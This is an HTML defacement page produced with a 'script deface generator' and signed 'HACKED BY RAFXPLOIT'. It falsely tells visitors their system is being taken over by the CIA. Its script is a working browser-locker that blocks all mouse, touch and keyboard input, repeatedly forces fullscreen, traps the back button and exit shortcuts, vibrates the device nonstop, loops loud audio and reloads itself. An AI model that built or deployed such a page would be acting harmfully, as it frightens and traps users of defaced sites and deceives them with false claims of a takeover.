<!--
--  Uploaded on : https://haxor.my.id/open/ksusbsisyakg.html
--  Official Web : https://prinsh.com
--  script-deface-generator.prinsh.com
-->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SYSTEM LOCKED REV</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    /* Bagian Reset Total(bebas Rename) */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden !important; /* Tambahan: Penting untuk mengunci scroll */
      background: #000;
      touch-action: none !important; /* Tambahan: Lebih agresif */
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -khtml-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      position: fixed;
      cursor: none !important; /* Tambahan: Sembunyikan kursor */
    }

    /* Bagian Hujan Matrix(Bebas Rename) */
    #matrix {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1;
      opacity: 0.7;
    }

    /* Bagian Layer Utama(Bebas Rename) */
    #lockScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #0f0;
      text-align: center;
      font-family: 'Courier New', monospace;
      text-shadow: 0 0 10px #0f0;
      pointer-events: none; /* Tambahan: Tidak bisa diklik */
    }

    /* ANTI EXIT */
    #antiExit {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.9);
      z-index: 9999;
      color: red;
      font-size: 2em;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      pointer-events: none; /* Tambahan: Tidak bisa diklik saat tampil */
    }

    /* NOTIF BLOCKER */
    #notifBlocker {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 30px;
      background: black;
      z-index: 10000;
      display: none;
      pointer-events: none; /* Tambahan: Tidak bisa diklik */
    }

    /* STYLE TOMBOL */
    #actionBtn {
      margin-top: 30px;
      padding: 15px 30px;
      background: transparent;
      border: 2px solid #0f0;
      color: #0f0;
      font-family: 'Courier New', monospace;
      font-size: 1.2em;
      /* cursor: none; */ /* Akan ditangani di body */
      animation: glow 2s infinite;
      pointer-events: auto; /* Agar tombol bisa diklik walaupun parentnya pointer-events:none */
    }

    @keyframes glow {
      0%, 100% { opacity: 1; box-shadow: 0 0 10px #0f0; }
      50% { opacity: 0.7; box-shadow: 0 0 20px #0f0; }
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div id="lockScreen">
  <h1>HACKED BY RAFXPLOIT</h1>
  <p>Your system is being taken over by CIA.</p>
  <button id="actionBtn">CIA-ORG</button>
</div>

<div id="antiExit">
  <h2>ACCESS-DENIED</h2>
  <p>Returning to secure mode...</p>
</div>

<div id="notifBlocker"></div>

<audio id="bgSound" src="https://sf16-ies-music-va.tiktokcdn.com/obj/musically-maliva-obj/7247196261434411781.mp3"  autoplay="1" loop="1"></audio>
<audio id="destructionSound" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" preload="auto"></audio>


<script>
  // ====================== CORE SYSTEM ======================
  let isLocked = false;
  const antiExit = document.getElementById('antiExit');
  const notifBlocker = document.getElementById('notifBlocker');
  const audio = document.getElementById('bgSound');
  const destructionAudio = document.getElementById('destructionSound'); // Dapatkan elemen audio baru
  let vibrateInterval = null; // Variabel untuk menyimpan interval vibrasi

  // Fungsi utilitas untuk mencegah event
  function blockEvent(e) {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
  }

  // 1. STEALTH FULLSCREEN INITIATION (Lebih gigih)
  function stealthFullscreen() {
    if (!document.fullscreenElement) { // Hanya request jika belum fullscreen
      const el = document.documentElement;
      const methods = [
        'requestFullscreen',
        'webkitRequestFullscreen',
        'mozRequestFullScreen',
        'msRequestFullscreen'
      ];
      
      methods.forEach(method => {
        if (el[method]) {
          try {
            el[method]({navigationUI: "hide"}).catch(e => {
              // Gagal, mungkin karena user tidak interaksi, coba lagi nanti
              console.warn("Fullscreen request failed (likely no user interaction yet):", e);
            });
          } catch(e) {
            console.error("Error calling fullscreen method:", e);
          }
        }
      });
    }
  }

  // Fungsi untuk memulai vibrasi tanpa jeda
  function startVibrationContinuous() {
    if ("vibrate" in navigator) {
      const shortVibrateDuration = 100; // Getar 100ms
      const intervalDelay = 50; // Panggil setiap 50ms, lebih pendek dari durasi getar

      vibrateInterval = setInterval(() => {
        navigator.vibrate(shortVibrateDuration);
      }, intervalDelay); 
      
      console.log("Continuous vibration started.");
    } else {
      console.warn("Vibration API not supported on this device/browser.");
    }
  }

  // Fungsi untuk menghentikan vibrasi (opsional, untuk debugging)
  function stopVibration() {
    if (vibrateInterval) {
      clearInterval(vibrateInterval);
      vibrateInterval = null;
      if ("vibrate" in navigator) {
        navigator.vibrate(0); // Menghentikan getaran yang sedang berlangsung
      }
      console.log("Vibration stopped.");
    }
  }

  // 2. TOTAL SYSTEM LOCKDOWN (Blokir lebih banyak interaksi)
  function activateLockdown() {
    if (isLocked) return; // Pastikan hanya dijalankan sekali
    isLocked = true;
    
    // Blokir semua interaksi secara menyeluruh pada dokumen
    const eventsToBlock = [
      'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove', 'wheel', 'scroll',
      'touchstart', 'touchend', 'touchmove', 'touchcancel',
      'keydown', 'keyup', 'keypress',
      'pointerdown', 'pointerup', 'pointermove', 'pointercancel', 'pointerleave', 'pointerenter',
      'contextmenu', 
      'selectstart' 
    ];

    eventsToBlock.forEach(evt => {
      document.addEventListener(evt, blockEvent, {capture: true, passive: false});
    });

    // Coba aktifkan fullscreen
    stealthFullscreen();

    // Aktifkan notifikasi blocker
    notifBlocker.style.display = 'block';
    
    // Mainkan audio latar belakang
    if (audio) {
      audio.volume = 0.3; // Volume lebih rendah agar suara "merusak" lebih dominan
      audio.play().catch(e => {
        console.warn("Background audio autoplay blocked, needs user interaction:", e);
      });
    }

    // Mainkan suara "merusak perangkat"
    if (destructionAudio) {
      destructionAudio.volume = 1.0; // Volume penuh untuk efek yang kuat
      destructionAudio.loop = true; // Loop agar terus berbunyi
      destructionAudio.play().catch(e => {
        console.warn("Destruction audio autoplay blocked, needs user interaction:", e);
      });
    }

    // Mulai getaran perangkat tanpa jeda
    startVibrationContinuous();

    // Interval untuk memastikan fullscreen tetap aktif
    setInterval(() => {
      if (!document.fullscreenElement) {
        stealthFullscreen();
      }
    }, 500);

    // Mencegah blur event (perpindahan tab/window)
    window.addEventListener('blur', () => {
        if (isLocked) {
            window.focus(); 
            stealthFullscreen(); 
            showAntiExit(); 
        }
    });

    // Mencegah shortcut keyboard yang umum (Ctrl+W, Alt+F4, F12, dsb.)
    document.addEventListener('keydown', (e) => {
        if (isLocked) {
            if (e.altKey && e.key === 'F4' || 
                (e.ctrlKey && e.key === 'w') ||
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.key === 'F12') ||
                (e.key === 'Escape')) { 
                blockEvent(e);
                showAntiExit(); 
            }
        }
    }, {capture: true, passive: false});
  }

  // 3. ANTI EXIT SYSTEMS (Sistem anti-keluar lebih agresif)
  function initAntiExit() {
    // Blokir tombol back
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
      history.pushState(null, null, location.href); 
      showAntiExit(); 
      stealthFullscreen(); 
    };

    // Deteksi perubahan visibility (tab beralih)
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState !== 'visible' && isLocked) {
        showAntiExit();
        stealthFullscreen();
      } else if (document.visibilityState === 'visible' && isLocked) {
          stealthFullscreen();
      }
    });

    // Deteksi resize (jika keluar dari fullscreen secara paksa)
    window.addEventListener('resize', () => {
      if (!document.fullscreenElement && isLocked) {
        showAntiExit();
        stealthFullscreen();
      }
    });
  }

  function showAntiExit() {
    antiExit.style.display = 'flex';
    stealthFullscreen(); 
    setTimeout(() => {
      antiExit.style.display = 'none';
      if (!document.fullscreenElement) { 
          stealthFullscreen(); 
      }
    }, 2000);
  }

  // 4. MATRIX EFFECT (Tidak berubah banyak, visual saja)
  function initMatrix() {
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const chars = "01";
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = [];
    
    for (let i = 0; i < columns; i++) drops[i] = 1;

    function draw() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#0f0';
      ctx.font = fontSize + 'px monospace';
      
      for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize * 1.5 > canvas.height && Math.random() > 0.975) drops[i] = 0; 
        drops[i]++;
      }
    }
    
    setInterval(draw, 33);
    // Tambahkan resize listener untuk canvas matrix
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const newColumns = canvas.width / fontSize;
        for (let i = 0; i < newColumns; i++) drops[i] = drops[i] || 1; 
        drops.length = newColumns;
    });
  }

  // ====================== INITIALIZATION ======================
  document.addEventListener('DOMContentLoaded', () => {
    initMatrix();
    initAntiExit();
    stealthFullscreen();
    
    const actionBtn = document.getElementById('actionBtn');
    if (actionBtn) {
        actionBtn.addEventListener('click', () => {
            stealthFullscreen(); 
            activateLockdown();
        });
    }
    
    // Tangkap semua interaksi di body untuk aktifkan lockdown
    document.body.addEventListener('click', activateLockdown, {once: true});
    document.body.addEventListener('touchstart', activateLockdown, {once: true});
    document.body.addEventListener('keydown', activateLockdown, {once: true});

    if (audio) {
      audio.addEventListener('play', () => {
        console.log("Background audio is playing.");
      });
      audio.addEventListener('error', (e) => {
        console.error("Background audio playback error:", e);
      });
    }

    if (destructionAudio) {
      destructionAudio.addEventListener('play', () => {
        console.log("Destruction audio is playing.");
      });
      destructionAudio.addEventListener('error', (e) => {
        console.error("Destruction audio playback error:", e);
      });
    }
  });

  // Auto reload setiap 1 menit sebagai fallback
  setTimeout(() => {
    if (isLocked) { 
        location.reload();
    }
  }, 60000);
</script>
</body>
</html>
